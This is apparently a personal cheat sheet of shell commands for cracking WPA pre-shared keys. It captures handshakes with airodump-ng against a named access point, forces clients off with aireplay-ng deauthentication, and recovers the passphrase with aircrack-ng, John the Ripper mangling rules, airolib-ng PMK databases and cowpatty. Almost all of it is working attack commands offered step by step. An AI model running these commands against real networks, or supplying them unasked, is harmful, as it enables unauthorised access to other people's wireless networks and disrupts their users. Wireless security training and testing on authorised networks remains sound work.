Is wpa? yes

###############################################
# WPA crack preshared key                     #
###############################################
# STEP 1: dump ap on ch
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w wepfrag mon0
# STEP 2: fake auth
# 60 to reauth every 60 seconds
aireplay-ng -1 60 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# STEP 3: deauth
aireplay-ng -0 1 -a 4C:60:DE:4A:62:80  -c 48:51:B7:DB:90:DE  mon0
# STEP 4: crack wpa handshake once airodump reports captured
    # wpa four way handshake consists of two pairs if not matching incomplete capture
aircrack-ng -0 -w <wordlist> <capture.cap>
    # try larger wordlists as needed


###############################################
# BONUS: pairwise master key cracking         #
###############################################
# STEP 1: create essid wordlist
echo "hostileNetwork2g" > essid.txt
# STEP 2: import essid wordlist
airolib-ng testdb --import essid.txt
# STEP 3: import password wordlist
    # many words not valid for wpa use will not be imported
airolib-ng testdb --import passwd <pw_wordlist>
# STEP 4: generate psks
airolib-ng testdb --batch
# STEP 5: check airolib stats
airolib-ng testdb --stats
# STEP 6: 
aircrack-ng -r testdb <wpa.cap>

###############################################
# BONUS: aircrack and john the ripper mangling rules    
###############################################
# STEP 1: dump ap on ch
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w wepfrag mon0
# STEP 2: deauth
aireplay-ng -0 1 -a 4C:60:DE:4A:62:80  -c 48:51:B7:DB:90:DE  mon0
# STEP 3: john the ripper word mangling
vim john.conf
    # modify wordlist rules to add two and three digits to word
    # $[0-9]$[0-9]
    # $[0-9]$[0-9]$[0-9]
john --wordlist=<wordlist> --rules --stdout | aircrack-ng -0 -e hostileNetwork2g -w - <wpa.cap>
    # -w - is used to accept the pipe output from john the ripper




###############################################
# BONUS: cowpatty dictionary attack    
###############################################
# STEP 1: capture wpa handshake
skip . . . 
# STEP 2: recover passphrase
cowpatty -r <wpa.cap> -f <wordlist> -2 -s <essid>

###############################################
# BONUS: cowpatty rainbowtables    
###############################################
# STEP 1: capture wpa handshake
skip . . . 
# STEP 2: generate hashes
genpmk -f <wordlist> -d hack.hashes -s essid
# STEP 3: crack
cowpatty -r <wpa.cap> -d hack.hashes -2 -s essid

